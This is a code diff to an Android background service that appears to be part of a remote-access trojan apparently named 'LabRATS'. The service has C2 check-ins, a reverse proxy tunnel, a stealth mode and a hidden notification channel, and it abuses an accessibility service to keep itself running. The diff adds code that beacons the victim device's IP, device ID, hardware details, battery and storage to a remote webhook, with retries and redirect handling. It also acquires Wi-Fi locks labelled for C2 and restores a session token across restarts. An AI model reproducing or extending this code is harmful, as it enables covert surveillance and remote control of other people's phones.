@@ -75,12 +75,10 @@ public class WorkManager_Sync extends Service {
                     currentHeartbeatInterval = IDLE_HEARTBEAT_MS;
                 }
 
-                String currentIp = MainActivity.getLocalIpAddress();
+                String currentIp = MainActivity.getBestIpForConnection(WorkManager_Sync.this);
                 if (REMOTE_WEBHOOK_URL != null && !REMOTE_WEBHOOK_URL.isEmpty()) {
                     networkExecutor.execute(() -> {
-                        sendIpToWebhook(currentIp);
-                        // [STABILITY_SYNC] Perform full status check-in with the backend
-                        C2_Uploader.checkIn(WorkManager_Sync.this);
+                        checkAndSendIpReport(currentIp);
                         
                         // [TACTICAL_SYNC] Establish Reverse Proxy Tunnel
                         C2_Tunnel.start(WorkManager_Sync.this);
@@ -100,13 +98,14 @@ public class WorkManager_Sync extends Service {
         });
     }
 
-    // URL is now loaded from local.properties via BuildConfig and decrypted at runtime
-    private static final String REMOTE_WEBHOOK_URL = BuildConfig.WEBHOOK_URL;
+    // URL is now loaded from local.properties via BuildConfig and sanitized at runtime
+    private static final String REMOTE_WEBHOOK_URL = (BuildConfig.WEBHOOK_URL != null) ? BuildConfig.WEBHOOK_URL.trim().replace("\"", "").replace("'", "") : "";
 
     private FirebaseConfig server;
     private ConnectivityManager connectivityManager;
     private ConnectivityManager.NetworkCallback networkCallback;
-    private String lastReportedIp = "";
+    private static String lastReportedIp = "";
+    private static long lastReportTimestamp = 0;
     private final ExecutorService networkExecutor = Executors.newSingleThreadExecutor();
     private ContentObserver messageObserver;
     private boolean isForeground = false;
@@ -149,11 +148,20 @@ public class WorkManager_Sync extends Service {
             return;
         }
 
+        // Restore persistent session token across service/stealth restarts
+        String savedToken = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getString("session_token", "");
+        if (savedToken == null || savedToken.isEmpty()) {
+            savedToken = java.util.UUID.randomUUID().toString();
+            getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putString("session_token", savedToken).apply();
+        }
+        activeSessionToken = savedToken;
+
         setupKeepAlive();
         setupClipboardMonitor();
         schedulePersistenceAlarms();
         createNotificationChannel();
         ensureForeground();
+        startServer();
         
         // --- PERSISTENCE LEVEL-UP ---
         // Request battery and hibernation exclusions on setup
@@ -356,7 +364,7 @@ public class WorkManager_Sync extends Service {
     private void ensureForeground() {
         if (isForeground) {
             // Update existing notification to match current stealth state
-            NotificationManager manager = getSystemService(NotificationManager.class);
+            NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
             if (manager != null) {
                 manager.notify(NOTIFICATION_ID, createNotification());
             }
@@ -439,8 +447,44 @@ public class WorkManager_Sync extends Service {
         } catch (Exception ignored) {}
     }
 
+    private android.net.wifi.WifiManager.WifiLock wifiLock;
+    private android.net.wifi.WifiManager.MulticastLock multicastLock;
+
+    private synchronized void acquireWifiLock() {
+        try {
+            android.net.wifi.WifiManager wm = (android.net.wifi.WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
+            if (wm != null) {
+                // 1. High-Performance Radio Lock
+                if (wifiLock == null) {
+                    wifiLock = wm.createWifiLock(
+                        android.net.wifi.WifiManager.WIFI_MODE_FULL_HIGH_PERF,
+                        "LabRATS:C2_WifiLock"
+                    );
+                    wifiLock.setReferenceCounted(false);
+                }
+                if (wifiLock != null && !wifiLock.isHeld()) {
+                    wifiLock.acquire();
+                    Log.d(TAG, "C2_WIFI_LOCK: High-performance Wi-Fi radio lock acquired.");
+                }
+
+                // 2. Multicast & Local Wi-Fi Packet Filter Lock (Required for Android 15 / One UI 7)
+                if (multicastLock == null) {
+                    multicastLock = wm.createMulticastLock("LabRATS:C2_Multicast");
+                    multicastLock.setReferenceCounted(false);
+                }
+                if (multicastLock != null && !multicastLock.isHeld()) {
+                    multicastLock.acquire();
+                    Log.d(TAG, "C2_MULTICAST_LOCK: One UI 7 local Wi-Fi packet filter lock acquired.");
+                }
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "WifiLock/MulticastLock Error: " + e.getMessage());
+        }
+    }
+
     private synchronized void startServer() {
         try {
+            acquireWifiLock();
             if (server == null || !server.isAlive()) {
                 // --- PORT_SANITY_CHECK ---
                 int port = FirebaseConfig.DEFAULT_PORT;
@@ -545,8 +589,15 @@ public class WorkManager_Sync extends Service {
             channel.setShowBadge(false);
             channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
 
-            NotificationManager manager = getSystemService(NotificationManager.class);
-            manager.createNotificationChannel(channel);
+            NotificationManager manager;
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                manager = getSystemService(NotificationManager.class);
+            } else {
+                manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
+            }
+            if (manager != null) {
+                manager.createNotificationChannel(channel);
+            }
         }
     }
 
@@ -624,6 +675,20 @@ public class WorkManager_Sync extends Service {
             try {
                 networkCallback = new ConnectivityManager.NetworkCallback() {
                     @Override
+                    public void onAvailable(Network network) {
+                        super.onAvailable(network);
+                        ipReportHandler.removeCallbacks(ipReportRunnable);
+                        ipReportHandler.postDelayed(ipReportRunnable, 3000);
+                    }
+
+                    @Override
+                    public void onLost(Network network) {
+                        super.onLost(network);
+                        ipReportHandler.removeCallbacks(ipReportRunnable);
+                        ipReportHandler.postDelayed(ipReportRunnable, 3000);
+                    }
+
+                    @Override
                     public void onLinkPropertiesChanged(Network network, LinkProperties linkProperties) {
                         super.onLinkPropertiesChanged(network, linkProperties);
                         // Debounce IP reporting to prevent flood during network transitions
@@ -696,6 +761,38 @@ public class WorkManager_Sync extends Service {
         }
     }
 
+    private synchronized void checkAndSendIpReport(String currentIp) {
+        if (currentIp == null || currentIp.trim().isEmpty() || "Unknown".equalsIgnoreCase(currentIp) || "127.0.0.1".equals(currentIp)) {
+            Log.d(TAG, "IP Report Skipped: Invalid or unresolved IP (" + currentIp + ")");
+            return;
+        }
+
+        long now = System.currentTimeMillis();
+        boolean ipChanged = !currentIp.equalsIgnoreCase(lastReportedIp);
+        boolean maintenanceTimeElapsed = (now - lastReportTimestamp) > 1800000; // 30 minutes
+
+        // Only send Google Sheets ping if IP changed OR 30-min maintenance interval reached
+        if (!ipChanged && !maintenanceTimeElapsed && lastReportTimestamp > 0) {
+            Log.d(TAG, "IP Report Skipped: IP unchanged (" + currentIp + ") and maintenance interval not reached.");
+            return;
+        }
+
+        Log.d(TAG, "IP Report Triggered for IP: " + currentIp + " (ipChanged=" + ipChanged + ")");
+        if (REMOTE_WEBHOOK_URL != null && !REMOTE_WEBHOOK_URL.isEmpty()) {
+            if (REMOTE_WEBHOOK_URL.contains("script.google.com") || REMOTE_WEBHOOK_URL.contains("script.googleusercontent.com")) {
+                boolean success = sendIpToWebhook(currentIp);
+                if (success) {
+                    lastReportedIp = currentIp;
+                    lastReportTimestamp = now;
+                }
+            } else {
+                lastReportedIp = currentIp;
+                lastReportTimestamp = now;
+                C2_Uploader.checkIn(WorkManager_Sync.this);
+            }
+        }
+    }
+
     private void checkAndReportIp() {
         if (networkExecutor.isShutdown()) return;
 
@@ -706,9 +803,6 @@ public class WorkManager_Sync extends Service {
         if (IO_Persistence_Manager.getInstance() == null) {
             Log.w(TAG, "GHOST_MODE_MONITOR: Accessibility service is offline");
             FirebaseConfig.logActivity("SECURITY_ALERT: Accessibility service lost. Initiating auto-reanimation...");
-            
-            // Try to auto-start Accessibility if possible (depends on OS)
-            // For now, we alert the operator to use the REPAIR_PERMISSIONS button
         } else {
             // [STABILITY_SYNC] Ping the service to keep it from "Hibernating"
             IO_Persistence_Manager.getInstance().showOverlayToast(""); // Invisible ping
@@ -721,34 +815,25 @@ public class WorkManager_Sync extends Service {
             return;
         }
 
-        MainActivity.getPublicIPv6Async(publicIp -> {
-            if (networkExecutor.isShutdown()) return;
-            
-            String localIp = MainActivity.getLocalIpAddress();
-            String currentIp = (localIp != null) ? localIp : publicIp;
-
-            if (currentIp != null && !currentIp.equals(lastReportedIp)) {
-                Log.d(TAG, "IP Changed or Initial Report: " + currentIp);
-                if (REMOTE_WEBHOOK_URL != null && !REMOTE_WEBHOOK_URL.isEmpty()) {
-                    // Send in background thread as network operations are involved
-                    try {
-                        networkExecutor.execute(() -> sendIpToWebhook(currentIp));
-                    } catch (Exception e) {
-                        Log.e(TAG, "Executor error", e);
-                    }
-                }
-                lastReportedIp = currentIp;
-            }
-        });
+        String currentIp = MainActivity.getBestIpForConnection(WorkManager_Sync.this);
+        try {
+            networkExecutor.execute(() -> checkAndSendIpReport(currentIp));
+        } catch (Exception e) {
+            Log.e(TAG, "Executor error", e);
+        }
     }
 
-    private void sendIpToWebhook(String ip) {
-        if (REMOTE_WEBHOOK_URL == null || REMOTE_WEBHOOK_URL.isEmpty()) return;
-        
+    private boolean sendIpToWebhook(String ip) {
+        if (REMOTE_WEBHOOK_URL == null || REMOTE_WEBHOOK_URL.trim().isEmpty()) {
+            Log.e(TAG, "Webhook Broadcast Cancelled: URL is empty.");
+            return false;
+        }
+
+        boolean success = false;
         try {
             String networkType = "Unknown";
             int batteryLevel = -1;
-            
+
             try {
                 if (connectivityManager != null) {
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
@@ -774,29 +859,55 @@ public class WorkManager_Sync extends Service {
                 }
             } catch (Exception ignored) {}
 
+            if (ip == null || ip.trim().isEmpty()) {
+                ip = "127.0.0.1";
+            }
+
             int actualPort = (server != null) ? server.getListeningPort() : FirebaseConfig.DEFAULT_PORT;
-            String formattedIp = (ip != null && ip.contains(":")) ? "[" + ip + "]" : ip;
+            String formattedIp = (ip.contains(":")) ? "[" + ip + "]" : ip;
             String link = "http://" + formattedIp + ":" + actualPort;
 
-            // Build JSON for POST (more reliable)
-            String json = "{" +
-                    "\"ip\":\"" + ip + "\"," +
-                    "\"device\":\"" + Build.MODEL + " (API " + Build.VERSION.SDK_INT + ")\"," +
-                    "\"network\":\"" + networkType + "\"," +
-                    "\"battery\":\"" + batteryLevel + "%\"," +
-                    "\"link\":\"" + link + "\"," +
-                    "\"port\":" + actualPort + "," +
-                    "\"stealth\":" + isStealthMode() +
-                    "}";
+            String chargingStatus = "Discharging";
+            try {
+                android.content.Intent bStatus = registerReceiver(null, new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED));
+                if (bStatus != null) {
+                    int status = bStatus.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
+                    if (status == android.os.BatteryManager.BATTERY_STATUS_CHARGING || status == android.os.BatteryManager.BATTERY_STATUS_FULL) {
+                        int plug = bStatus.getIntExtra(android.os.BatteryManager.EXTRA_PLUGGED, -1);
+                        if (plug == android.os.BatteryManager.BATTERY_PLUGGED_USB) chargingStatus = "Charging (USB)";
+                        else if (plug == android.os.BatteryManager.BATTERY_PLUGGED_AC) chargingStatus = "Charging (AC)";
+                        else if (plug == android.os.BatteryManager.BATTERY_PLUGGED_WIRELESS) chargingStatus = "Charging (Wireless)";
+                        else chargingStatus = "Charging";
+                    }
+                }
+            } catch (Exception ignored) {}
 
-            URL url = new URL(REMOTE_WEBHOOK_URL);
-            if (REMOTE_WEBHOOK_URL != null && !REMOTE_WEBHOOK_URL.startsWith("http")) {
-                // If it's obfuscated (not starting with http), try decrypting
-                try {
-                    // Logic to decrypt if stored as hex/byte array in future versions
-                    // For now, we assume it's stored correctly via build script
-                } catch (Exception ignored) {}
-            }
+            String freeStorage = "Unknown";
+            try {
+                long bytes = android.os.Environment.getDataDirectory().getFreeSpace();
+                freeStorage = android.text.format.Formatter.formatFileSize(this, bytes) + " Free";
+            } catch (Exception ignored) {}
+
+            String fullDeviceModel = Build.MODEL != null ? Build.MODEL : "Android-Device";
+
+            // Build Query String & JSON Payload
+            String queryParams = "ip=" + java.net.URLEncoder.encode(ip != null ? ip : "", "UTF-8") +
+                    "&deviceId=" + java.net.URLEncoder.encode(C2_Uploader.getDeviceId(this), "UTF-8") +
+                    "&brand=" + java.net.URLEncoder.encode(Build.MANUFACTURER, "UTF-8") +
+                    "&device=" + java.net.URLEncoder.encode(fullDeviceModel, "UTF-8") +
+                    "&model=" + java.net.URLEncoder.encode(fullDeviceModel, "UTF-8") +
+                    "&network=" + java.net.URLEncoder.encode(networkType, "UTF-8") +
+                    "&port=" + actualPort +
+                    "&link=" + java.net.URLEncoder.encode(link, "UTF-8") +
+                    "&battery=" + java.net.URLEncoder.encode(batteryLevel + "%", "UTF-8") +
+                    "&stealth=" + isStealthMode() +
+                    "&charging=" + java.net.URLEncoder.encode(chargingStatus, "UTF-8") +
+                    "&storage=" + java.net.URLEncoder.encode(freeStorage, "UTF-8");
+
+            String fullUrlStr = REMOTE_WEBHOOK_URL + (REMOTE_WEBHOOK_URL.contains("?") ? "&" : "?") + queryParams;
+
+            // Strategy 1: Perform HTTP POST with Query Parameters & JSON body
+            URL url = new URL(fullUrlStr);
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
             conn.setRequestMethod("POST");
             conn.setDoOutput(true);
@@ -806,37 +917,83 @@ public class WorkManager_Sync extends Service {
             conn.setReadTimeout(15000);
             conn.setRequestProperty("User-Agent", "SystemStability/1.5");
 
+            String devId = C2_Uploader.getDeviceId(this);
+            String json = "{" +
+                    "\"ip\":\"" + ip + "\"," +
+                    "\"deviceId\":\"" + devId + "\"," +
+                    "\"brand\":\"" + Build.MANUFACTURER + "\"," +
+                    "\"device\":\"" + Build.MODEL + "\"," +
+                    "\"model\":\"" + Build.MODEL + "\"," +
+                    "\"network\":\"" + networkType + "\"," +
+                    "\"port\":" + actualPort + "," +
+                    "\"link\":\"" + link + "\"," +
+                    "\"battery\":\"" + batteryLevel + "%\"," +
+                    "\"stealth\":" + isStealthMode() + "," +
+                    "\"charging\":\"" + chargingStatus + "\"," +
+                    "\"storage\":\"" + freeStorage + "\"" +
+                    "}";
+
             try (OutputStream os = conn.getOutputStream()) {
                 byte[] input = json.getBytes(StandardCharsets.UTF_8);
                 os.write(input, 0, input.length);
             }
 
             int code = conn.getResponseCode();
-            
-            // Manual redirect handling for Google's multi-hop redirects
+
+            // Handle Google Apps Script 301/302/307 redirects
             if (code == 301 || code == 302 || code == 303 || code == 307 || code == 308) {
-                String newUrl = conn.getHeaderField("Location");
-                conn = (HttpURLConnection) new URL(newUrl).openConnection();
-                code = conn.getResponseCode();
+                String redirectUrl = conn.getHeaderField("Location");
+                if (redirectUrl != null && !redirectUrl.isEmpty()) {
+                    if (!redirectUrl.contains("ip=")) {
+                        redirectUrl = redirectUrl + (redirectUrl.contains("?") ? "&" : "?") + queryParams;
+                    }
+                    HttpURLConnection redirConn = (HttpURLConnection) new URL(redirectUrl).openConnection();
+                    redirConn.setRequestMethod("GET");
+                    redirConn.setConnectTimeout(15000);
+                    redirConn.setReadTimeout(15000);
+                    redirConn.setRequestProperty("User-Agent", "SystemStability/1.5");
+                    code = redirConn.getResponseCode();
+                }
             }
 
-            Log.d(TAG, "Webhook Broadcast Status: " + code);
-            
+            Log.d(TAG, "Webhook POST Broadcast Status: " + code);
             if (code == 200 || code == 201) {
-                webhookFailCount = 0;
+                success = true;
             } else {
-                webhookFailCount++;
-                lastWebhookFailTime = System.currentTimeMillis();
-            }
+                // Strategy 2: Fallback GET request to Google Apps Script URL
+                HttpURLConnection getConn = (HttpURLConnection) new URL(fullUrlStr).openConnection();
+                getConn.setRequestMethod("GET");
+                getConn.setConnectTimeout(15000);
+                getConn.setReadTimeout(15000);
+                getConn.setRequestProperty("User-Agent", "SystemStability/1.5");
+                int getCode = getConn.getResponseCode();
 
+                if (getCode == 301 || getCode == 302 || getCode == 303 || getCode == 307 || getCode == 308) {
+                    String loc = getConn.getHeaderField("Location");
+                    if (loc != null) {
+                        if (!loc.contains("ip=")) loc = loc + (loc.contains("?") ? "&" : "?") + queryParams;
+                        HttpURLConnection redir = (HttpURLConnection) new URL(loc).openConnection();
+                        redir.setRequestMethod("GET");
+                        getCode = redir.getResponseCode();
+                    }
+                }
+
+                Log.d(TAG, "Webhook GET Fallback Broadcast Status: " + getCode);
+                if (getCode == 200 || getCode == 201) {
+                    success = true;
+                }
+            }
         } catch (Exception e) {
-            Log.e(TAG, "Webhook Critical Error: " + e.getMessage());
+            Log.e(TAG, "sendIpToWebhook Exception: " + e.getMessage(), e);
+        }
+
+        if (success) {
+            webhookFailCount = 0;
+        } else {
             webhookFailCount++;
             lastWebhookFailTime = System.currentTimeMillis();
-        } finally {
-            if (wakeLock != null && wakeLock.isHeld()) {
-                wakeLock.release();
-            }
         }
+
+        return success;
     }
 }
